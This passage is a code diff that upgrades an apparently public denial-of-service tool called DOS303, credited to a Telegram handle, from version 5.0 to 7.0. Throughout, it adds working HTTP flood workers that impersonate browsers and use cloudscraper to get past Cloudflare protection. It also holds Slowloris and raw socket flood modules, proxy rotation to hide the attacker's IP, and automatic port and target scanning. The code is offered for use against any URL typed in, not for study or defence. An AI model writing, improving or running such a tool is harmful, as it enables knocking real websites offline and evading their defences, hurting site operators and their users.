+                    logger.info(f"   🖥️  Server: {server}")
+        except Exception as e:
+            logger.warning(f"   ⚠️ Initial HTTP check failed: {e}")
+        
+        return {
+            'host': host,
+            'port': port,
+            'target': final_target,
+            'open_ports': open_ports
+        }
 
 # ============================================
 # ATTACK MODULES
@@ -570,9 +723,49 @@ class HTTPFloodAttack:
             timeout=aiohttp.ClientTimeout(total=30)
         )
 
+        self.httpx_client = None
+        if not args.no_httpx:
+            try:
+                limits = httpx.Limits(max_keepalive_connections=0, max_connections=0)
+                self.httpx_client = httpx.AsyncClient(
+                    http2=True,
+                    timeout=httpx.Timeout(10.0, connect=5.0),
+                    limits=limits,
+                    verify=False
+                )
+                logger.info("httpx client initialized (HTTP/2 support)")
+            except Exception as e:
+                logger.warning(f"httpx init failed: {e}")
+                self.httpx_client = None
+
+        self.cloudscraper = None
+        if not args.no_cloudscraper:
+            try:
+                self.cloudscraper = cloudscraper.create_scraper(
+                    browser={
+                        'browser': 'chrome',
+                        'platform': 'windows',
+                        'mobile': False
+                    },
+                    delay=1,
+                    interpreter='native'
+                )
+                logger.info("cloudscraper initialized (Cloudflare bypass)")
+            except Exception as e:
+                logger.warning(f"cloudscraper init failed: {e}")
+                self.cloudscraper = None
+
+        self.curl_impersonate = not args.no_curl_cffi
+
     async def attack(self):
         logger.info(f"HTTP Flood (Bypass) - {self.workers} workers")
         logger.info("👑 Coded by: @iazmonmn - Telegram: https://t.me/iazmonmn")
+        if self.httpx_client:
+            logger.info("   ✅ httpx (HTTP/2) enabled")
+        if self.cloudscraper:
+            logger.info("   ✅ cloudscraper (Cloudflare) enabled")
+        if self.curl_impersonate:
+            logger.info("   ✅ curl_cffi impersonation enabled")
         tasks = []
         for i in range(self.workers):
             tasks.append(asyncio.create_task(self._worker()))
@@ -583,6 +776,8 @@ class HTTPFloodAttack:
             await asyncio.gather(*tasks, return_exceptions=True)
         finally:
             await self.session.close()
+            if self.httpx_client:
+                await self.httpx_client.aclose()
 
     async def _worker(self):
         while not self.stop_event.is_set():
@@ -591,18 +786,17 @@ class HTTPFloodAttack:
                 if self.args.no_proxy:
                     proxy = None
                 else:
-                    # Get proxy from manager (handles recheck internally)
-                    proxy = await self.proxy_manager.get_next_proxy()
+                    proxy = self.proxy_manager.get_next_proxy() if self.proxy_manager else None
                     if proxy is None:
                         self.consecutive_failures += 1
-                        if self.consecutive_failures > 2:
+                        if self.consecutive_failures > 5:
                             if not self.direct_mode:
                                 logger.warning("⚡ Switching to direct mode (no proxy)")
                                 self.direct_mode = True
                             proxy = None
                             self.consecutive_failures = 0
                         else:
-                            await asyncio.sleep(0.001)
+                            await asyncio.sleep(0.1)
                             continue
                     else:
                         self.consecutive_failures = 0
@@ -619,29 +813,106 @@ class HTTPFloodAttack:
                     static_ext = ['.css', '.js', '.png', '.jpg', '.ico', '.woff2']
                     url = urljoin(self.target_url, f"/static/{random.randint(1000,9999)}{random.choice(static_ext)}")
 
-                timeout = aiohttp.ClientTimeout(
-                    total=10,
-                    connect=5,
-                    sock_read=8
-                )
-
                 start_time = time.time()
+                transport = random.random()
 
                 try:
-                    if method == 'GET':
-                        async with self.session.get(url, headers=headers, proxy=proxy,
-                                                    timeout=timeout) as response:
-                            await response.read()
-                    elif method == 'POST':
-                        payload_size = random.choice(self.payload_sizes)
-                        payload = 'x' * payload_size
-                        async with self.session.post(url, data=payload, headers=headers,
-                                                     proxy=proxy, timeout=timeout) as response:
-                            await response.read()
+                    if transport < 0.6:
+                        if method == 'GET':
+                            async with self.session.get(url, headers=headers, proxy=proxy,
+                                                        timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
+                        elif method == 'POST':
+                            if headers.get('Content-Type') == 'application/json':
+                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
+                            else:
+                                payload = "x=" + "x" * random.choice(self.payload_sizes)
+                            async with self.session.post(url, data=payload, headers=headers, proxy=proxy,
+                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
+                        else:
+                            async with self.session.head(url, headers=headers, proxy=proxy,
+                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
+
+                    elif transport < 0.8 and self.httpx_client:
+                        proxies = {"http://": proxy, "https://": proxy} if proxy else None
+                        if method == 'GET':
+                            resp = await self.httpx_client.get(url, headers=headers, proxy=proxies)
+                        elif method == 'POST':
+                            if headers.get('Content-Type') == 'application/json':
+                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
+                            else:
+                                payload = "x=" + "x" * random.choice(self.payload_sizes)
+                            resp = await self.httpx_client.post(url, data=payload, headers=headers, proxy=proxies)
+                        else:
+                            resp = await self.httpx_client.head(url, headers=headers, proxy=proxies)
+                        resp.read()
+
+                    elif transport < 0.9 and self.cloudscraper:
+                        loop = asyncio.get_running_loop()
+                        proxies = {"http": proxy, "https": proxy} if proxy else None
+                        if method == 'GET':
+                            await loop.run_in_executor(
+                                None,
+                                partial(self.cloudscraper.get, url, headers=headers, proxies=proxies, timeout=10)
+                            )
+                        elif method == 'POST':
+                            if headers.get('Content-Type') == 'application/json':
+                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
+                            else:
+                                payload = "x=" + "x" * random.choice(self.payload_sizes)
+                            await loop.run_in_executor(
+                                None,
+                                partial(self.cloudscraper.post, url, data=payload, headers=headers, proxies=proxies, timeout=10)
+                            )
+                        else:
+                            await loop.run_in_executor(
+                                None,
+                                partial(self.cloudscraper.head, url, headers=headers, proxies=proxies, timeout=10)
+                            )
+
+                    elif self.curl_impersonate:
+                        loop = asyncio.get_running_loop()
+                        proxies = {"http": proxy, "https": proxy} if proxy else None
+                        impersonate = random.choice(["chrome", "firefox", "safari"])
+                        if method == 'GET':
+                            await loop.run_in_executor(
+                                None,
+                                partial(curl_requests.get, url, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
+                            )
+                        elif method == 'POST':
+                            if headers.get('Content-Type') == 'application/json':
+                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
+                            else:
+                                payload = "x=" + "x" * random.choice(self.payload_sizes)
+                            await loop.run_in_executor(
+                                None,
+                                partial(curl_requests.post, url, data=payload, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
+                            )
+                        else:
+                            await loop.run_in_executor(
+                                None,
+                                partial(curl_requests.head, url, headers=headers, proxies=proxies, timeout=10, impersonate=impersonate)
+                            )
+
                     else:
-                        async with self.session.head(url, headers=headers, proxy=proxy,
-                                                     timeout=timeout) as response:
-                            await response.read()
+                        if method == 'GET':
+                            async with self.session.get(url, headers=headers, proxy=proxy,
+                                                        timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
+                        elif method == 'POST':
+                            if headers.get('Content-Type') == 'application/json':
+                                payload = json.dumps({"data": "x" * random.choice(self.payload_sizes)})
+                            else:
+                                payload = "x=" + "x" * random.choice(self.payload_sizes)
+                            async with self.session.post(url, data=payload, headers=headers, proxy=proxy,
+                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
+                        else:
+                            async with self.session.head(url, headers=headers, proxy=proxy,
+                                                         timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                await response.read()
 
                     async with self.lock:
                         self.requests_sent += 1
@@ -650,13 +921,12 @@ class HTTPFloodAttack:
                 except (ConnectionResetError, ConnectionAbortedError):
                     await asyncio.sleep(random.uniform(0.001, 0.003))
                     continue
-                except Exception:
-                    if proxy and not self.args.no_proxy:
-                        await self.proxy_manager.mark_dead(proxy)
+                except Exception as e:
+                    if proxy and not self.args.no_proxy and self.proxy_manager:
+                        self.proxy_manager.mark_dead(proxy)
                     await asyncio.sleep(random.uniform(0.001, 0.003))
                     continue
 
-                # Ultra low delay
                 if proxy is None or self.direct_mode:
                     delay = max(0.0005, random.gauss(0.001, 0.0005))
                 else:
@@ -666,8 +936,8 @@ class HTTPFloodAttack:
             except (ConnectionResetError, ConnectionAbortedError):
                 await asyncio.sleep(random.uniform(0.001, 0.003))
             except asyncio.TimeoutError:
-                if proxy and not self.args.no_proxy:
-                    await self.proxy_manager.mark_dead(proxy)
+                if proxy and not self.args.no_proxy and self.proxy_manager:
+                    self.proxy_manager.mark_dead(proxy)
                 await asyncio.sleep(random.uniform(0.001, 0.003))
             except Exception:
                 await asyncio.sleep(random.uniform(0.001, 0.003))
@@ -717,7 +987,10 @@ class SlowlorisAttack:
 
     async def _create_connection(self):
         try:
-            reader, writer = await asyncio.open_connection(self.host, self.port)
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(self.host, self.port),
+                timeout=5
+            )
             path = f"/{random.randint(1, 999999)}"
             headers = [
                 f"Host: {self.host}",
@@ -783,7 +1056,10 @@ class SocketFloodAttack:
     async def _worker(self):
         while not self.stop_event.is_set():
             try:
-                reader, writer = await asyncio.open_connection(self.host, self.port)
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(self.host, self.port),
+                    timeout=3
+                )
                 for _ in range(random.randint(3, 10)):
                     size = random.choice([64, 128, 256, 512, 1024, 2048])
                     writer.write(b'X' * size)
@@ -794,6 +1070,8 @@ class SocketFloodAttack:
                 writer.close()
                 await writer.wait_closed()
                 await asyncio.sleep(random.uniform(0.005, 0.02))
+            except (asyncio.TimeoutError, ConnectionRefusedError):
+                await asyncio.sleep(random.uniform(0.02, 0.05))
             except Exception:
                 await asyncio.sleep(random.uniform(0.02, 0.05))
 
@@ -809,7 +1087,7 @@ class SocketFloodAttack:
             last_count = current
 
 # ============================================
-# MAIN CONTROLLER
+# MAIN CONTROLLER - OPTIMIZED SEQUENCE
 # ============================================
 class DOS303Controller:
     def __init__(self, args):
@@ -819,182 +1097,153 @@ class DOS303Controller:
         self.stop_event = asyncio.Event()
         self.user_agent_manager = UserAgentManager()
         self.header_manager = HeaderManager()
-        self.proxy_manager = ProxyManager(refresh_interval=300, max_uses_per_proxy=5) if not args.no_proxy else None
+        self.proxy_manager = None
         self.path_manager = PathManager()
         self.http_attack = None
-        self.target_port = 80
+        self.target_info = None
+        self.capacity = None
 
-    async def _initial_scan(self, url):
-        logger.info("🔍 Scanning target...")
+    async def run_optimized_sequence(self):
+        """اجرای ترتیب بهینه: Auto-Calibrate → Proxy → Target → Attack"""
+        show_banner()
+        logger.info("=" * 60)
+        logger.info("🔥 DOS303 v7.0 - OPTIMIZED ATTACK SEQUENCE")
+        logger.info("👑 Coded by: @iazmonmn")
+        logger.info("📱 Telegram: https://t.me/iazmonmn")
+        logger.info("=" * 60)
+        
+        # ==========================================
+        # STEP 1: AUTO-CALIBRATE (First!)
+        # ==========================================
+        logger.info("")
+        logger.info("📊 STEP 1/4: AUTO-CALIBRATION")
+        logger.info("─" * 40)
+        
+        if self.args.workers or self.args.connections or self.args.rate:
+            self.capacity = {
+                'level': 5,
+                'level_name': "Custom",
+                'workers': self.args.workers or 500,
+                'connections': self.args.connections or 1000,
+                'packet_rate': self.args.rate or 2000,
+                'proxy_workers': min(mp.cpu_count() * 8, 500)
+            }
+            logger.info(f"Using manual settings: workers={self.capacity['workers']}")
+        else:
+            analyzer = SystemAnalyzer()
+            self.capacity = await analyzer.analyze()
+        
+        logger.info(f"   🎯 Level: {self.capacity['level']} - {self.capacity['level_name']}")
+        logger.info(f"   👥 Workers for attack: {self.capacity['workers']:,}")
+        logger.info(f"   🔗 Connections: {self.capacity['connections']:,}")
+        logger.info(f"   📦 Packet rate: {self.capacity['packet_rate']:,}/sec")
+        logger.info(f"   🚀 Proxy workers: {self.capacity['proxy_workers']:,}")
+        
+        # ==========================================
+        # STEP 2: PROXY ANALYSIS (MAX POWER!)
+        # ==========================================
+        logger.info("")
+        logger.info("🌐 STEP 2/4: PROXY ANALYSIS (MAXIMUM POWER)")
+        logger.info("─" * 40)
+        
         if self.args.no_proxy:
-            proxy = None
+            logger.warning("⚠️  NO-PROXY MODE ENABLED: Your IP will be exposed!")
+            self.proxy_manager = None
         else:
-            proxy = await self.proxy_manager.get_next_proxy() if self.proxy_manager else None
-            if not proxy:
-                logger.warning("No proxy for initial scan, skipping.")
-                return
-        try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as session:
-                async with session.get(url, proxy=proxy, timeout=15) as resp:
-                    logger.info(f"   ✅ Target responded with status: {resp.status}")
-                    server = resp.headers.get('Server', 'Unknown')
-                    logger.info(f"   🖥️  Server: {server}")
-                    content_type = resp.headers.get('Content-Type', 'Unknown')
-                    logger.info(f"   📄 Content-Type: {content_type}")
-        except Exception as e:
-            logger.warning(f"   ❌ Initial scan failed: {e}")
-
-    async def _port_scan(self, host):
-        logger.info("🔎 Scanning open ports...")
-        open_ports = await PortScanner.scan(host)
-        if open_ports:
-            logger.info(f"   ✅ Open ports found: {open_ports}")
-            if 80 in open_ports:
-                port = 80
-            elif 443 in open_ports:
-                port = 443
-            else:
-                port = open_ports[0]
-            logger.info(f"   💡 Selected port: {port}")
-            return port
-        else:
-            logger.warning("   ❌ No open ports found, using default port 80")
-            return 80
-
-    async def start(self):
-        try:
-            show_banner()
-            logger.info("="*50)
-            logger.info("🔥 DOS303 v5.0 - Hardened Edition")
-            logger.info("👑 Coded by: @iazmonmn")
-            logger.info("📱 Telegram: https://t.me/iazmonmn")
-            logger.info("🚫 NO TOR - Pure HTTP Proxies Only")
-            logger.info("="*50)
+            self.proxy_manager = ProxyManager(max_proxies=2000)
+            # Use maximum workers for proxy scanning
+            proxy_workers = self.capacity.get('proxy_workers', min(mp.cpu_count() * 8, 500))
+            count = self.proxy_manager.load_proxies(max_workers=proxy_workers)
             
-            target = self.args.target if self.args.target else self._get_target()
-            if not target:
-                return
-
-            logger.info(f"🎯 Target: {target}")
-            parsed = urlparse(target)
-            host = parsed.hostname
-            original_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
-
-            self.target_port = await self._port_scan(host)
-            
-            if self.target_port != original_port:
-                new_target = f"{parsed.scheme}://{host}:{self.target_port}"
-                logger.info(f"🔄 Using scanned port: {new_target}")
-                target = new_target
-                parsed = urlparse(target)
-
-            port = self.target_port
-            logger.info(f"🔍 Target: {host}:{port}")
-            logger.info(f"✅ SSL verification disabled for bypass")
-            if self.args.no_proxy:
-                logger.warning("⚠️  NO-PROXY MODE ENABLED: Your IP will be exposed!")
-
-            if self.args.workers or self.args.connections or self.args.rate:
-                capacity = {
-                    'level': 5,
-                    'level_name': "Custom",
-                    'workers': self.args.workers or 500,
-                    'connections': self.args.connections or 1000,
-                    'packet_rate': self.args.rate or 2000
-                }
-                logger.info(f"Using manual settings: workers={capacity['workers']}, connections={capacity['connections']}, rate={capacity['packet_rate']}")
+            if count == 0:
+                logger.error("❌ No proxies found! Falling back to no-proxy mode.")
+                self.proxy_manager = None
             else:
-                analyzer = SystemAnalyzer()
-                capacity = await analyzer.analyze()
-
-            logger.info(f"   🎯 Level: {capacity['level']} - {capacity['level_name']}")
-            logger.info(f"   👥 Workers: {capacity['workers']:,}")
-            logger.info(f"   🔗 Connections: {capacity['connections']:,}")
-            logger.info(f"   📦 Packet rate: {capacity['packet_rate']:,}/sec")
-            if self.proxy_manager:
-                logger.info(f"   🛡️  Bypass: User-Agent({len(self.user_agent_manager.user_agents)}) + Proxy Chain + Path({len(self.path_manager.paths)})")
-            else:
-                logger.info(f"   🛡️  Bypass: User-Agent({len(self.user_agent_manager.user_agents)}) + Path({len(self.path_manager.paths)}) (NO PROXY)")
-
-            if self.proxy_manager:
-                await self.proxy_manager.refresh_chain()
-
-            if not self.args.no_scan:
-                await self._initial_scan(target)
-
-            logger.info("⚔️ STARTING BYPASS ATTACKS")
-
-            self.http_attack = HTTPFloodAttack(
-                target, capacity['workers'],
-                self.proxy_manager, self.user_agent_manager,
-                self.header_manager, self.path_manager,
-                self.stop_event, self.args
-            )
-            self.attacks.append(self.http_attack)
-
-            if not self.args.no_slowloris:
-                slowloris = SlowlorisAttack(host, port, capacity['connections'], self.stop_event, self.args)
-                self.attacks.append(slowloris)
-            else:
-                logger.info("Slowloris disabled by user.")
-
-            if not self.args.no_socket:
-                socket_attack = SocketFloodAttack(host, port, capacity['packet_rate'], self.stop_event, self.args)
-                self.attacks.append(socket_attack)
-            else:
-                logger.info("Socket flood disabled by user.")
-
-            self.start_time = time.time()
-
-            loop = asyncio.get_running_loop()
-            for sig in (signal.SIGINT, signal.SIGTERM):
-                try:
-                    loop.add_signal_handler(sig, lambda: asyncio.create_task(self._stop()))
-                except NotImplementedError:
-                    pass
-
-            tasks = []
-            for attack in self.attacks:
-                tasks.append(asyncio.create_task(attack.attack()))
-            tasks.append(asyncio.create_task(self._global_monitor()))
-
-            logger.info("✅ All attacks started!")
-            logger.info("⏰ Running... (Ctrl+C to stop)")
-
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-        except KeyboardInterrupt:
-            logger.warning("⚠️ Attack stopped by user")
-        except Exception as e:
-            logger.error(f"💥 Fatal error: {str(e)[:60]}")
-        finally:
-            self.stop_event.set()
-            if self.http_attack and hasattr(self.http_attack, 'session'):
-                await self.http_attack.session.close()
-            logger.info("="*50)
-            logger.info("👑 DOS303 v5.0 - Coded by @iazmonmn")
-            logger.info("📱 Telegram: https://t.me/iazmonmn")
-            logger.info("="*50)
-            logger.info("👋 DOS303 finished")
-
+                logger.info(f"✅ Proxy analysis complete: {count} proxies ready")
+                self.proxy_manager.start_background_refresh()
+                logger.info("[*] Background proxy refresh started (every 30s)")
+        
+        # ==========================================
+        # STEP 3: TARGET ANALYSIS
+        # ==========================================
+        logger.info("")
+        logger.info("🎯 STEP 3/4: TARGET ANALYSIS")
+        logger.info("─" * 40)
+        
+        target = self.args.target if self.args.target else self._get_target()
+        if not target:
+            logger.error("❌ No target provided!")
+            return
+        
+        self.target_info = await TargetAnalyzer.analyze(target, self.proxy_manager)
+        target = self.target_info['target']
+        host = self.target_info['host']
+        port = self.target_info['port']
+        
+        # ==========================================
+        # STEP 4: ATTACK
+        # ==========================================
+        logger.info("")
+        logger.info("⚔️ STEP 4/4: LAUNCHING ATTACK")
+        logger.info("─" * 40)
+        logger.info(f"🎯 Target: {target}")
+        logger.info(f"👥 Workers: {self.capacity['workers']:,}")
+        logger.info(f"🛡️  Bypass: User-Agent(fake) + Proxy Chain + Path({len(self.path_manager.paths)})")
+        logger.info(f"📚  Libs: httpx={not self.args.no_httpx}, cloudscraper={not self.args.no_cloudscraper}, curl_cffi={not self.args.no_curl_cffi}")
+        logger.info("=" * 60)
+        
+        # Create attacks
+        self.http_attack = HTTPFloodAttack(
+            target, self.capacity['workers'],
+            self.proxy_manager, self.user_agent_manager,
+            self.header_manager, self.path_manager,
+            self.stop_event, self.args
+        )
+        self.attacks.append(self.http_attack)
+        
+        if not self.args.no_slowloris:
+            slowloris = SlowlorisAttack(host, port, self.capacity['connections'], self.stop_event, self.args)
+            self.attacks.append(slowloris)
+        
+        if not self.args.no_socket:
+            socket_attack = SocketFloodAttack(host, port, self.capacity['packet_rate'], self.stop_event, self.args)
+            self.attacks.append(socket_attack)
+        
+        self.start_time = time.time()
+        
+        # Signal handlers
+        loop = asyncio.get_running_loop()
+        for sig in (signal.SIGINT, signal.SIGTERM):
+            try:
+                loop.add_signal_handler(sig, lambda: asyncio.create_task(self._stop()))
+            except NotImplementedError:
+                pass
+        
+        # Start all attacks
+        tasks = []
+        for attack in self.attacks:
+            tasks.append(asyncio.create_task(attack.attack()))
+        tasks.append(asyncio.create_task(self._global_monitor()))
+        
+        logger.info("✅ All attacks started!")
+        logger.info("⏰ Running... (Ctrl+C to stop)")
+        
+        await asyncio.gather(*tasks, return_exceptions=True)
+    
     async def _stop(self):
         logger.warning("⚠️ Stopping gracefully...")
-        logger.info("="*50)
-        logger.info("👑 DOS303 v5.0 - Coded by @iazmonmn")
-        logger.info("📱 Telegram: https://t.me/iazmonmn")
-        logger.info("="*50)
+        if self.proxy_manager:
+            self.proxy_manager.stop()
         self.stop_event.set()
-
+    
     def _get_target(self):
-        target = input("\033[96mEnter target URL: \033[0m").strip()
+        target = input(Fore.CYAN + "Enter target URL: " + Style.RESET_ALL).strip()
         if not target:
-            logger.error("❌ No target")
             return None
         if not target.startswith(('http://', 'https://')):
             target = 'http://' + target
         return target
-
+    
     async def _global_monitor(self):
         iteration = 0
         while not self.stop_event.is_set():
@@ -1004,18 +1253,17 @@ class DOS303Controller:
             hours = int(elapsed // 3600)
             minutes = int((elapsed % 3600) // 60)
             seconds = int(elapsed % 60)
-
+            
             if self.proxy_manager:
-                total, dead, active, chain_len, queue_size, in_fallback = await self.proxy_manager.get_stats()
-                fallback_status = "🔴 FALLBACK" if in_fallback else "🟢 NORMAL"
-                logger.info(f"🌐 Proxies: {active}/{total} active (dead: {dead}) | Chain: {chain_len} | Queue: {queue_size} {fallback_status}")
+                proxy_count = self.proxy_manager.get_proxy_count()
+                logger.info(f"🌐 Proxies: {proxy_count} active")
             else:
-                logger.info("🌐 Proxies: DISABLED (no-proxy mode)")
-
-            logger.info("="*50)
+                logger.info("🌐 Proxies: DISABLED")
+            
+            logger.info("=" * 50)
             logger.info(f"📊 ATTACK STATS - Round {iteration}")
             logger.info(f"⏱️  Time: {hours:02d}:{minutes:02d}:{seconds:02d}")
-
+            
             total_req = 0
             for attack in self.attacks:
                 if isinstance(attack, HTTPFloodAttack):
@@ -1032,45 +1280,39 @@ class DOS303Controller:
                         packets = attack.packets_sent
                     logger.info(f"✅ Socket Packets: {packets:,}")
                     total_req += packets
-
+            
             rate = total_req / elapsed if elapsed > 0 else 0
             logger.info(f"📈 Total: {total_req:,} | Rate: {rate:.1f}/sec")
-            logger.info("="*50)
-
-            if not self.args.no_health and iteration % 3 == 0 and self.http_attack:
-                await self._check_site_proxied(self.http_attack.target_url)
-
-    async def _check_site_proxied(self, url):
-        if self.args.no_proxy:
-            proxy = None
-        else:
-            proxy = await self.proxy_manager.get_next_proxy() if self.proxy_manager else None
-            if not proxy:
-                logger.warning("No proxy available for health check, skipping.")
-                return
+            logger.info("=" * 50)
+    
+    async def start(self):
         try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as session:
-                try:
-                    async with session.get(url, proxy=proxy, timeout=15) as response:
-                        if response.status >= 500:
-                            logger.warning(f"❌ Site may be DOWN (HTTP {response.status})")
-                        elif response.status >= 400:
-                            logger.warning(f"⚠️  Site error (HTTP {response.status})")
-                        else:
-                            logger.info(f"✅ Site responding (HTTP {response.status})")
-                except Exception as e:
-                    logger.warning(f"❌ Health check failed: {e}")
-                    if proxy:
-                        await self.proxy_manager.mark_dead(proxy)
+            await self.run_optimized_sequence()
+        except KeyboardInterrupt:
+            logger.warning("⚠️ Attack stopped by user")
         except Exception as e:
-            logger.error(f"Health check error: {e}")
+            logger.error(f"💥 Fatal error: {str(e)[:60]}")
+            import traceback
+            traceback.print_exc()
+        finally:
+            self.stop_event.set()
+            if self.http_attack and hasattr(self.http_attack, 'session'):
+                await self.http_attack.session.close()
+            if self.http_attack and hasattr(self.http_attack, 'httpx_client') and self.http_attack.httpx_client:
+                await self.http_attack.httpx_client.aclose()
+            if self.proxy_manager:
+                self.proxy_manager.stop()
+            logger.info("=" * 50)
+            logger.info("👑 DOS303 v7.0 - Coded by @iazmonmn")
+            logger.info("📱 Telegram: https://t.me/iazmonmn")
+            logger.info("=" * 50)
+            logger.info("👋 DOS303 finished")
 
 # ============================================
 # COMMAND LINE ARGUMENTS
 # ============================================
 def parse_args():
-    parser = argparse.ArgumentParser(description='DOS303 v5.0 - Hardened Multi-Vector Attack Tool (NO TOR)')
+    parser = argparse.ArgumentParser(description='DOS303 v7.0 - Optimized Attack Sequence')
     parser.add_argument('target', nargs='?', help='Target URL (e.g., http://example.com)')
     parser.add_argument('--workers', type=int, help='Number of HTTP workers (default: auto)')
     parser.add_argument('--connections', type=int, help='Max Slowloris connections (default: auto)')
@@ -1080,7 +1322,10 @@ def parse_args():
     parser.add_argument('--no-socket', action='store_true', help='Disable Socket flood attack')
     parser.add_argument('--no-health', action='store_true', help='Disable health checks')
     parser.add_argument('--no-scan', action='store_true', help='Disable initial target scan')
-    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy (for internal testing only - exposes your IP!)')
+    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy (exposes your IP!)')
+    parser.add_argument('--no-httpx', action='store_true', help='Disable httpx (HTTP/2) transport')
+    parser.add_argument('--no-cloudscraper', action='store_true', help='Disable cloudscraper (Cloudflare bypass)')
+    parser.add_argument('--no-curl-cffi', action='store_true', help='Disable curl_cffi impersonation')
     return parser.parse_args()
 
 # ============================================
@@ -1095,6 +1340,6 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n\033[93m⚠️ Exiting...\033[0m")
+        print("\n" + Fore.YELLOW + "⚠️ Exiting..." + Style.RESET_ALL)
     except Exception as e:
-        print(f"\n\033[91m💥 Fatal: {e}\033[0m")
+        print("\n" + Fore.RED + f"💥 Fatal: {e}" + Style.RESET_ALL)
